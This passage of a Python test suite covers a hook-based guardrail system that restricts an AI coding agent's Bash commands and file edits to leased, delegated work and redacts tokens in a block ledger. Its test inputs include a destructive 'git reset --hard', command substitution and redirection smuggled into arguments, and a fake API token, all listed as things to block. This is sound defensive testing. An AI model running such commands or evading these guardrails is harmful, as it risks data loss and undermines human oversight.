                "prompt": "AI_DLC_SAFETY_DOMAIN=codex_config_edit: update hooks",
            }
            result = self.dispatch_with_payload(root, payload)
            output = result["hookSpecificOutput"]
            self.assertEqual(output["hookEventName"], "UserPromptSubmit")
            self.assertIn("Workflow safety_domain: codex_config_edit", output["additionalContext"])

    def test_hook_dispatch_permission_request_uses_current_schema(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            codex_dir = repo / ".codex"
            codex_dir.mkdir()
            (codex_dir / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            allowed = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": {"cmd": "pwd"}},
            )
            allowed_output = allowed["hookSpecificOutput"]
            self.assertEqual(allowed_output["hookEventName"], "PermissionRequest")
            self.assertEqual(allowed_output["decision"]["behavior"], "allow")
            self.assertNotIn("permissionDecision", allowed)

            denied = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": {"cmd": "mkdir -p scratch"}},
            )
            denied_output = denied["hookSpecificOutput"]
            self.assertEqual(denied_output["hookEventName"], "PermissionRequest")
            self.assertEqual(denied_output["decision"]["behavior"], "deny")
            self.assertIn("message", denied_output["decision"])
            self.assertNotIn("permissionDecision", denied)

    def test_block_reason_is_schema_safe_and_diagnosable(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            payload = {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(root / "web" / "README.md")}}
            blocked = self.dispatch_with_payload(root, payload)
            output = blocked["hookSpecificOutput"]
            reason = output["permissionDecisionReason"]
            self.assertEqual(output["hookEventName"], "PreToolUse")
            self.assertEqual(output["permissionDecision"], "deny")
            self.assertTrue(reason.startswith("AI-DLC_BLOCK "))
            self.assertIn("writable session requires a claimed lease", reason)

            diagnosis = hooks.diagnose_block(root, "PreToolUse", "Edit", "", reason)
            self.assertEqual(diagnosis["block_type"], "needs_assignment")
            self.assertEqual(diagnosis["suggested_route"], "delegate_phase_owner")
            self.assertIn("delegate_to_subagent", diagnosis["allowed_next_actions"])
            self.assertIn("report_delegation_deadlock", diagnosis["allowed_next_actions"])
            self.assertNotIn("retry_command", diagnosis["allowed_next_actions"])

    def test_block_diagnose_cli_maps_mutating_bash_to_assignment_route(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            stdout = io.StringIO()
            with patch("aidlc.cli.Path.cwd", return_value=repo), contextlib.redirect_stdout(stdout):
                code = cli.main([
                    "block-diagnose",
                    "--event",
                    "PreToolUse",
                    "--tool",
                    "Bash",
                    "--command",
                    "mkdir -p scratch",
                    "--message",
                    "Controller-only: mutating Bash is blocked outside AI-DLC; delegate to a subagent.",
                ])
            self.assertEqual(code, 0)
            diagnosis = json.loads(stdout.getvalue())
            self.assertEqual(diagnosis["block_type"], "needs_assignment")
            self.assertEqual(diagnosis["suggested_route"], "delegate_phase_owner")
            self.assertEqual(
                diagnosis["allowed_next_actions"],
                ["inspect_current_phase", "create_assignment", "delegate_to_subagent", "report_delegation_deadlock"],
            )

    def test_block_diagnose_classifies_delegation_deadlock_without_workaround(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            diagnosis = hooks.diagnose_block(
                repo,
                "PreToolUse",
                "Bash",
                "ai-dlc assignment create --role dlc_initializer --writable packages/app.py",
                "Controller-only bootstrap/delegation deadlock: workspace-less assignment create requires a supported role and narrow matrix-approved --writable paths.",
            )
            self.assertEqual(diagnosis["block_type"], "needs_assignment")
            self.assertEqual(diagnosis["suggested_route"], "delegate_phase_owner")
            self.assertFalse(diagnosis["recoverable"])
            self.assertEqual(diagnosis["allowed_next_actions"], ["report_delegation_deadlock"])

    def test_block_event_is_recorded_to_user_ledger_and_redacted(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            home = tmp_path / "home"
            root, _ = self.create_workspace(tmp_path)

            blocked = self.dispatch_with_payload(
                root,
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Bash",
                    "tool_input": {"cmd": "API_TOKEN=supersecret mkdir -p scratch"},
                },
                {"HOME": str(home), "CODEX_SESSION_ID": "sess-ledger"},
            )
            self.assertEqual(blocked["decision"], "block")

            ledger = home / ".codex" / "ai-dlc" / "block-ledger" / "events.jsonl"
            self.assertTrue(ledger.exists())
            events = [json.loads(line) for line in ledger.read_text(encoding="utf-8").splitlines()]
            self.assertEqual(len(events), 1)
            event = events[0]
            self.assertEqual(event["session_id"], "sess-ledger")
            self.assertEqual(event["event"], "PreToolUse")
            self.assertEqual(event["workspace_id"], "LIN-123")
            self.assertEqual(event["requires_durable_record"], True)
            self.assertIn("[REDACTED]", event["command"])
            self.assertNotIn("supersecret", json.dumps(event))

    def test_read_only_false_positive_event_does_not_block_finish_boundary(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            home = tmp_path / "home"
            root, _ = self.create_workspace(tmp_path)

            blocked = self.dispatch_with_payload(
                root,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "FOO=1 git status"}},
                {"HOME": str(home)},
            )
            self.assertEqual(blocked["decision"], "block")
            self.assertIn("type=read_only_false_positive", blocked["reason"])

            with patch.dict(os.environ, {"HOME": str(home)}, clear=False):
                events = list_events(include_recorded=True)
                self.assertEqual(len(events), 1)
                self.assertEqual(events[0]["block_type"], "read_only_false_positive")
                self.assertFalse(events[0]["requires_durable_record"])
                self.assertTrue(events[0]["recorded"])
                self.assertEqual(open_blocker_errors(root, "finish"), [])

    def test_block_record_action_releases_finish_boundary(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            home = tmp_path / "home"
            root, _ = self.create_workspace(tmp_path)

            self.dispatch_with_payload(
                root,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "mkdir -p scratch"}},
                {"HOME": str(home)},
            )
            events_path = home / ".codex" / "ai-dlc" / "block-ledger" / "events.jsonl"
            event_id = json.loads(events_path.read_text(encoding="utf-8").splitlines()[0])["event_id"]

            with patch.dict(os.environ, {"HOME": str(home)}, clear=False):
                errors = open_blocker_errors(root, "finish")
            self.assertTrue(errors)
            self.assertIn(event_id, errors[0])

            stdout = io.StringIO()
            ref = root / ".codex" / "plans" / "blocker-fix.md"
            with (
                patch.dict(os.environ, {"HOME": str(home)}, clear=False),
                patch("aidlc.cli.Path.cwd", return_value=root),
                contextlib.redirect_stdout(stdout),
            ):
                code = cli.main([
                    "block",
                    "record",
                    "--event-id",
                    event_id,
                    "--type",
                    "external_fix_plan",
                    "--ref",
                    str(ref),
                    "--reason",
                    "repair in another session",
                ])
            self.assertEqual(code, 0)
            self.assertTrue(ref.exists())
            action = json.loads(stdout.getvalue())
            self.assertEqual(action["block_event_id"], event_id)
            self.assertEqual(action["action_type"], "external_fix_plan")

            with patch.dict(os.environ, {"HOME": str(home)}, clear=False):
                self.assertEqual(open_blocker_errors(root, "finish"), [])

    def test_stop_finish_boundary_blocks_only_unactioned_block_events(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            home = tmp_path / "home"
            root, _ = self.create_workspace(tmp_path)
            self.dispatch_with_payload(
                root,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "mkdir -p scratch"}},
                {"HOME": str(home)},
            )
            plan_path = root / "ai-dlc" / "plans" / "LIN-123.md"
            meta, body = read_frontmatter(plan_path)
            meta["status"] = "ready_to_finish"
            meta["current"]["phase"] = "ready_to_finish"
            write_frontmatter(plan_path, meta, body)

            blocked = self.dispatch_with_payload(root, {"hook_event_name": "Stop"}, {"HOME": str(home)})
            output = blocked["hookSpecificOutput"]
            self.assertEqual(output["hookEventName"], "Stop")
            self.assertEqual(output["decision"], "block")
            self.assertIn("open block events", output["reason"])
            self.assertIn("ai-dlc block record", output["reason"])

    def test_block_export_and_sync_support_async_repair_records(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            home = tmp_path / "home"
            root, _ = self.create_workspace(tmp_path)
            self.dispatch_with_payload(
                root,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "mkdir -p scratch"}},
                {"HOME": str(home)},
            )
            events_path = home / ".codex" / "ai-dlc" / "block-ledger" / "events.jsonl"
            event_id = json.loads(events_path.read_text(encoding="utf-8").splitlines()[0])["event_id"]

            exported = tmp_path / "external" / "blocker-plan.md"
            stdout = io.StringIO()
            with (
                patch.dict(os.environ, {"HOME": str(home)}, clear=False),
                patch("aidlc.cli.Path.cwd", return_value=root),
                contextlib.redirect_stdout(stdout),
            ):
                code = cli.main(["block", "export", "--event-id", event_id, "--plan", str(exported)])
            self.assertEqual(code, 0)
            self.assertTrue(exported.exists())
            self.assertIn(event_id, exported.read_text(encoding="utf-8"))

            actions = home / ".codex" / "ai-dlc" / "block-ledger" / "actions.jsonl"
            actions.unlink()
            decision = root / "ai-dlc" / "decisions" / "LIN-123.md"
            decision.write_text(decision.read_text(encoding="utf-8") + f"\n- block_event_id: {event_id}\n", encoding="utf-8")

            sync_stdout = io.StringIO()
            with (
                patch.dict(os.environ, {"HOME": str(home)}, clear=False),
                patch("aidlc.cli.Path.cwd", return_value=root),
                contextlib.redirect_stdout(sync_stdout),
            ):
                sync_code = cli.main(["block", "sync"])
            self.assertEqual(sync_code, 0)
            synced = json.loads(sync_stdout.getvalue())
            self.assertEqual(synced[0]["block_event_id"], event_id)
            self.assertEqual(synced[0]["action_type"], "durable_record")

    def test_hook_allows_explicit_git_finish_gate_outside_workspace(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            codex_dir = repo / ".codex"
            codex_dir.mkdir()
            (codex_dir / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            blocked = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "git add README.md"}},
            )
            self.assertEqual(blocked["decision"], "block")

            allowed_commands = [
                "AI_DLC_GIT_FINISH_APPROVED=1 git add README.md",
                "AI_DLC_GIT_FINISH_APPROVED=1 git commit -m codex-finish",
                "AI_DLC_GIT_FINISH_APPROVED=1 git switch -c codex-finish",
                "AI_DLC_GIT_FINISH_APPROVED=1 git push origin HEAD",
                "AI_DLC_GIT_FINISH_APPROVED=1 gh pr create --title test --body test",
            ]
            for command in allowed_commands:
                with self.subTest(command=command):
                    result = self.dispatch_with_payload(
                        repo,
                        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": command}},
                    )
                    self.assertEqual(result, {})

            destructive = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "AI_DLC_GIT_FINISH_APPROVED=1 git reset --hard"}},
            )
            self.assertEqual(destructive["decision"], "block")

    def test_hook_dispatch_root_system_project_context_is_explicit(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "root-system"
            root.mkdir()
            init_project(root, repo_paths={"web": "/tmp/web"}, repo_urls={"web": "git@example.com:web.git"})

            result = self.dispatch_with_payload(root, {"hook_event_name": "SessionStart"})
            output = result["hookSpecificOutput"]
            self.assertEqual(output["hookEventName"], "SessionStart")
            self.assertIn("AI-DLC root-system project", output["additionalContext"])
            self.assertNotIn("AI-DLC workspace ではありません", output["additionalContext"])

            blocked_bash = self.dispatch_with_payload(
                root,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "mkdir -p scratch"}},
            )
            self.assertEqual(blocked_bash["decision"], "block")
            self.assertIn("mutating Bash", blocked_bash["reason"])

    def test_hook_dispatch_uses_tool_workdir_for_workspace_classification(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            canonical_root = tmp_path / "canonical-root"
            canonical_root.mkdir()
            task_parent = tmp_path / "task"
            task_parent.mkdir()
            task_root, _ = self.create_workspace(task_parent)
            init_project(
                canonical_root,
                repo_paths={"web": str(task_root / "web")},
                repo_urls={"web": "git@example.com:web.git"},
            )
            self.prepare_active_web_item(task_root)
            bootstrap(task_root)

            task_command = self.dispatch_with_payload(
                canonical_root,
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Bash",
                    "tool_input": {"cmd": "ai-dlc transition executing", "workdir": str(task_root)},
                },
            )
            self.assertEqual(task_command, {})

            blocked_edit = self.dispatch_with_payload(
                canonical_root,
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Edit",
                    "tool_input": {"file_path": "web/README.md", "workdir": str(task_root)},
                },
            )
            self.assertEqual(blocked_edit["decision"], "block")
            self.assertIn("claimed lease", blocked_edit["reason"])

            assignment = assignment_create(task_root, "dlc_repo_worker", "web", ["web/README.md"], "WI-001")
            lease = agent_claim(task_root, assignment["id"], session_id="sess-workdir")
            allowed_edit = self.dispatch_with_payload(
                canonical_root,
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Edit",
                    "tool_input": {"file_path": "README.md", "workdir": str(task_root / "web")},
                },
                {"CODEX_SESSION_ID": lease["session_id"]},
            )
            self.assertEqual(allowed_edit, {})

            root_system_command = self.dispatch_with_payload(
                task_root,
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Bash",
                    "tool_input": {"cmd": "mkdir -p scratch", "workdir": str(canonical_root)},
                },
            )
            self.assertEqual(root_system_command["decision"], "block")
            self.assertIn("mutating Bash", root_system_command["reason"])

    def test_hook_dispatch_uses_camel_case_working_directory_for_workspace_resolution_and_ledger(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            fake_home = tmp_path / "home"
            canonical_root = tmp_path / "canonical-root"
            canonical_root.mkdir()
            task_parent = tmp_path / "task"
            task_parent.mkdir()
            task_root, _ = self.create_workspace(task_parent)
            init_project(
                canonical_root,
                repo_paths={"web": str(task_root / "web")},
                repo_urls={"web": "git@example.com:web.git"},
            )

            allowed_assignment = self.dispatch_with_payload(
                canonical_root,
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Bash",
                    "tool_input": {
                        "cmd": "ai-dlc assignment create --role dlc_plan_writer",
                        "workingDirectory": str(task_root),
                    },
                },
                {"HOME": str(fake_home)},
            )
            self.assertEqual(allowed_assignment, {})

            blocked_edit = self.dispatch_with_payload(
                canonical_root,
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Edit",
                    "tool_input": {
                        "file_path": "web/README.md",
                        "workingDirectory": str(task_root),
                    },
                },
                {"HOME": str(fake_home), "CODEX_SESSION_ID": "sess-camel-cwd"},
            )
            self.assertEqual(blocked_edit["decision"], "block")
            self.assertIn("claimed lease", blocked_edit["reason"])

            ledger = fake_home / ".codex" / "ai-dlc" / "block-ledger" / "events.jsonl"
            events = [json.loads(line) for line in ledger.read_text(encoding="utf-8").splitlines()]
            event = events[-1]
            self.assertEqual(event["workspace_id"], "LIN-123")
            self.assertEqual(event["effective_cwd"], str(task_root.resolve()))

    def test_hook_dispatch_prefers_explicit_workspace_target_from_root_system(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            fake_home = tmp_path / "home"
            root_system, task_root, _ = self.create_root_system_task_workspace(tmp_path)

            allowed_assignment = self.dispatch_with_payload(
                root_system,
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Bash",
                    "tool_input": {
                        "cmd": "ai-dlc assignment create --workspace LIN-123 --role dlc_plan_writer",
                    },
                },
                {"HOME": str(fake_home)},
            )
            self.assertEqual(allowed_assignment, {})
            ledger = fake_home / ".codex" / "ai-dlc" / "block-ledger" / "events.jsonl"
            self.assertFalse(ledger.exists())

            blocked_edit = self.dispatch_with_payload(
                root_system,
                {
                    "hook_event_name": "PreToolUse",
                    "tool_name": "Edit",
                    "tool_input": {"file_path": str(task_root / "web" / "README.md")},
                },
                {"HOME": str(fake_home), "CODEX_SESSION_ID": "sess-explicit-target"},
            )
            self.assertEqual(blocked_edit["decision"], "block")
            self.assertIn("direct edits are blocked outside AI-DLC", blocked_edit["reason"])

    def test_hook_dispatch_non_workspace_pret_tool_and_stop_are_schema_safe(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            outside = Path(tmp)

            session = self.dispatch_with_payload(outside, {"hook_event_name": "SessionStart"})
            self.assertIn("Project-local AI-DLC", session["hookSpecificOutput"]["additionalContext"])
            self.assertIn("ai-dlc ensure-context", session["hookSpecificOutput"]["additionalContext"])

            pretool = self.dispatch_with_payload(
                outside,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "pwd"}},
            )
            self.assertEqual(pretool, {})

            posttool = self.dispatch_with_payload(
                outside,
                {"hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_input": {"cmd": "pwd"}},
            )
            self.assertEqual(posttool, {})

            stop = self.dispatch_with_payload(outside, {"hook_event_name": "Stop"})
            self.assertEqual(stop, {})

    def test_hook_dispatch_allows_project_validation_commands_outside_workspace(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            codex_dir = repo / ".codex"
            codex_dir.mkdir()
            (codex_dir / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")
            absolute_test_path = repo / "tests" / "test_aidlc.py"

            commands = [
                "python3 -m py_compile packages/codex/.codex/ai-dlc/lib/aidlc/hooks.py",
                f"python3 -m py_compile {absolute_test_path}",
                "python3 -m unittest tests.test_aidlc",
                "python3 -m unittest tests.test_aidlc.AidlcTest.test_hook_allows_workspace_less_read_only_diagnostics_and_bootstrap_recovery",
                "python3 -m unittest tests.test_aidlc.AidlcTest.test_hook_allows_workspace_less_read_only_diagnostics_and_bootstrap_recovery tests.test_aidlc.AidlcTest.test_hook_dispatch_uses_camel_case_working_directory_for_workspace_resolution_and_ledger",
            ]
            for command in commands:
                with self.subTest(command=command):
                    allowed = self.dispatch_with_payload(
                        repo,
                        {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": command}},
                    )
                    self.assertEqual(allowed, {})

            blocked = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "python3 -m unittest tests.other_module"}},
            )
            self.assertEqual(blocked["decision"], "block")
            self.assertIn("mutating Bash", blocked["reason"])

    def test_hook_dispatch_uses_env_event_name_when_payload_omits_it(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            outside = Path(tmp)
            pretool = self.dispatch_with_payload(
                outside,
                {"tool_name": "Bash", "tool_input": {"cmd": "pwd"}},
                {"CODEX_HOOK_EVENT_NAME": "PreToolUse"},
            )
            self.assertEqual(pretool, {})

    def test_hook_dispatch_blocks_direct_edits_outside_workspace_when_project_requires_subagent(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            fake_home = Path(tmp) / "home"
            repo = Path(tmp)
            codex_dir = repo / ".codex"
            codex_dir.mkdir()
            (codex_dir / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")
            env = {"HOME": str(fake_home)}

            blocked_edit = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(repo / "README.md")}},
                env,
            )
            self.assertEqual(blocked_edit["decision"], "block")
            self.assertIn("delegate to a subagent", blocked_edit["reason"])

            allowed_config_edit = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(repo / ".codex" / "config.toml")}},
                env,
            )
            self.assertEqual(allowed_config_edit, {})

            allowed_agents_edit = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(repo / "AGENTS.md")}},
                env,
            )
            self.assertEqual(allowed_agents_edit, {})

            allowed_control_plane_edit = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(repo / "ai-dlc" / "docs" / "repair.md")}},
                env,
            )
            self.assertEqual(allowed_control_plane_edit, {})

            blocked_impl_edit = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(repo / "packages" / "codex" / ".codex" / "ai-dlc" / "lib" / "aidlc" / "hooks.py")}},
                env,
            )
            self.assertEqual(blocked_impl_edit["decision"], "block")
            self.assertIn("delegate to a subagent", blocked_impl_edit["reason"])

            blocked_bash = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "mkdir -p scratch"}},
                env,
            )
            self.assertEqual(blocked_bash["decision"], "block")
            self.assertIn("mutating Bash", blocked_bash["reason"])

            allowed_bash = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "git status --short"}},
                env,
            )
            self.assertEqual(allowed_bash, {})

    def test_hook_allows_workspace_less_read_only_diagnostics_and_bootstrap_recovery(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            (repo / ".codex").mkdir()
            (repo / ".codex" / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            commands = [
                "ai-dlc --help",
                "ai-dlc -h",
                "ai-dlc assignment --help",
                "ai-dlc assignment list",
                "ai-dlc inspect",
                "ai-dlc context",
                "ai-dlc ensure-context",
                "ai-dlc block list",
                "ai-dlc block list --json",
                "ai-dlc block actions",
                "ai-dlc block actions --json",
                "ai-dlc block-diagnose --cwd /tmp/task --event PreToolUse --tool Bash --command pwd --message needs_assignment",
                "ai-dlc assignment create --role dlc_repo_worker --repo source --work-item WI-001 --writable README.md",
                "ai-dlc assignment create --work-item WI-001 --writable README.md --repo source --role dlc_repo_worker",
                "ai-dlc assignment create --writable src/module.py --role dlc_repo_worker --repo source --work-item WI-001 --writable README.md",
                "ai-dlc assignment create --role dlc_repo_worker --repo source --work-item WI-001 --writable packages/app.py",
                "ai-dlc assignment create --role dlc_repo_worker --repo source --work-item WI-001 --writable tests/test_app.py",
                "ai-dlc assignment create --role dlc_initializer --writable ai-dlc/bootstrap/**",
                "ai-dlc assignment create --role dlc_initializer --writable .codex/config.toml",
                "ai-dlc assignment create --role dlc_repairer --writable ai-dlc/decisions/**",
                "ai-dlc assignment create --role dlc_repairer --writable ../.local/**",
            ]
            for cmd in commands:
                with self.subTest(cmd=cmd):
                    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
                    self.assertEqual(self.dispatch_with_payload(repo, payload), {})

    def test_hook_allows_only_narrow_workspace_less_codex_runtime_probes(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            (repo / ".codex").mkdir()
            (repo / ".codex" / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            allowed_commands = [
                "which codex",
                "command -v codex",
                "codex --version",
                "codex -V",
                "codex --help",
            ]
            for cmd in allowed_commands:
                with self.subTest(cmd=cmd):
                    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
                    self.assertEqual(self.dispatch_with_payload(repo, payload), {}, f"Expected allow for: {cmd}")

            blocked_commands = [
                "which python",
                "command -v python",
                "codex exec echo hi",
                "codex login",
                "codex logout",
                "codex help",
                "codex --version --json",
                "codex -V extra",
                "codex --version > out",
                "codex --version $(pwd)",
            ]
            for cmd in blocked_commands:
                with self.subTest(cmd=cmd):
                    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
                    blocked = self.dispatch_with_payload(repo, payload)
                    self.assertEqual(blocked["decision"], "block", f"Expected block for: {cmd}")
                    self.assertIn("mutating Bash", blocked["reason"])

    def test_hook_dispatch_allows_only_scoped_workspace_less_block_recovery_commands(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            repo = tmp_path / "repo"
            repo.mkdir()
            (repo / ".codex").mkdir()
            (repo / ".codex" / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")
            event_id = "B20260509T000000Z-test0001"

            allowed_commands = [
                f"ai-dlc block record --event-id {event_id} --ref ai-dlc/decisions/{event_id}.md",
                f"ai-dlc block record --event-id {event_id} --type repair_task_created --ref .codex/plans/{event_id}.md --reason tracked",
                "ai-dlc block sync",
                f"ai-dlc block export --event-id {event_id} --plan {tmp_path / 'external' / 'blocker-plan.md'}",
            ]
            for cmd in allowed_commands:
                with self.subTest(cmd=cmd):
                    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
                    self.assertEqual(self.dispatch_with_payload(repo, payload), {}, f"Expected allow for: {cmd}")

            blocked_commands = [
                f"ai-dlc block record --event-id {event_id} --ref packages/app.py",
                f"ai-dlc block record --event-id {event_id} --type invalid --ref ai-dlc/decisions/{event_id}.md",
                f"ai-dlc block record --event-id {event_id} --type deferred_by_user --ref ai-dlc/decisions/{event_id}.md",
                f"ai-dlc block record --event-id {event_id} --ref ai-dlc/decisions/{event_id}.md>out",
                f"ai-dlc block record --event-id {event_id} --ref ai-dlc/decisions/{event_id}.md<in",
                f"ai-dlc block export --event-id {event_id} --plan packages/blocker-plan.md",
                f"ai-dlc block export --event-id {event_id} --plan {tmp_path / 'external' / 'blocker-plan.md'}>out",
                "ai-dlc block sync --json",
                "ai-dlc block list --output file",
            ]
            for cmd in blocked_commands:
                with self.subTest(cmd=cmd):
                    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
                    blocked = self.dispatch_with_payload(repo, payload)
                    self.assertEqual(blocked["decision"], "block", f"Expected block for: {cmd}")
                    self.assertIn("mutating Bash", blocked["reason"])

    def test_hook_dispatch_allows_workspace_less_lifecycle_only_when_scoped(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            fake_home = tmp_path / "home"
            repo = tmp_path / "repo"
            self.init_repo(repo, "workspace-less lifecycle\n")
            (repo / ".codex").mkdir()
            (repo / ".codex" / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")
            env = {"HOME": str(fake_home)}

            with patch.dict(os.environ, env):
                assignment = assignment_create(repo, "dlc_repo_worker", "source", ["README.md"], "WI-001")

            claim_cmd = f"ai-dlc agent-claim --assignment {assignment['id']} --session-id sess-source"
            claim_payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": claim_cmd}}
            self.assertEqual(self.dispatch_with_payload(repo, claim_payload, env), {})

            bad_claim = self.dispatch_with_payload(
                repo,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "ai-dlc agent-claim --assignment A999 --session-id sess-source"}},
                env,
            )
            self.assertEqual(bad_claim["decision"], "block")

            with patch.dict(os.environ, env):
                agent_claim(repo, assignment["id"], session_id="sess-source")

            report_cmd = f"ai-dlc agent-report --assignment {assignment['id']} --status reported"
            release_cmd = f"ai-dlc agent-release --assignment {assignment['id']} --session-id sess-source"
            for cmd in [report_cmd, release_cmd]:
                with self.subTest(cmd=cmd):
                    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
                    self.assertEqual(self.dispatch_with_payload(repo, payload, env), {}, f"Expected allow for: {cmd}")

            blocked_commands = [
                f"ai-dlc agent-report --assignment {assignment['id']} --status done",
                f"ai-dlc agent-release --assignment {assignment['id']} --session-id wrong-session",
                f"ai-dlc agent-report --assignment A999 --status reported",
            ]
            for cmd in blocked_commands:
                with self.subTest(cmd=cmd):
                    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
                    blocked = self.dispatch_with_payload(repo, payload, env)
                    self.assertEqual(blocked["decision"], "block", f"Expected block for: {cmd}")

    def test_hook_blocks_incomplete_or_broad_workspace_less_repo_worker_assignment_create(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo = Path(tmp)
            (repo / ".codex").mkdir()
            (repo / ".codex" / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")

            commands = [
                "ai-dlc assignment create --role dlc_repo_worker",
                "ai-dlc assignment create --role dlc_repo_worker --repo source",
                "ai-dlc assignment create --role dlc_repo_worker --repo source --work-item WI-001",
                "ai-dlc assignment create --role dlc_repo_worker --repo source --work-item WI-001 --writable .",
                "ai-dlc assignment create --role dlc_repo_worker --repo source --work-item WI-001 --writable *",
                "ai-dlc assignment create --role dlc_repo_worker --repo source --work-item WI-001 --writable **",
                "ai-dlc assignment create --role dlc_repo_worker --repo source --work-item WI-001 --writable .git/config",
                "ai-dlc assignment create --role dlc_repo_worker --repo source --work-item WI-001 --writable .codex/config.toml",
                "ai-dlc assignment create --role dlc_repo_worker --repo source --work-item WI-001 --writable ai-dlc/report.md",
                "ai-dlc assignment create --role dlc_repo_worker --repo source --work-item WI-001 --writable workspace.yaml",
                "ai-dlc assignment create --role dlc_initializer --repo source --writable ai-dlc/bootstrap/**",
                "ai-dlc assignment create --role dlc_initializer --work-item WI-001 --writable ai-dlc/bootstrap/**",
                "ai-dlc assignment create --role dlc_initializer --writable packages/app.py",
                "ai-dlc assignment create --role dlc_repairer --writable tests/test_app.py",
                "ai-dlc assignment create --role dlc_plan_writer --writable ai-dlc/plans/**",
            ]
            for cmd in commands:
                with self.subTest(cmd=cmd):
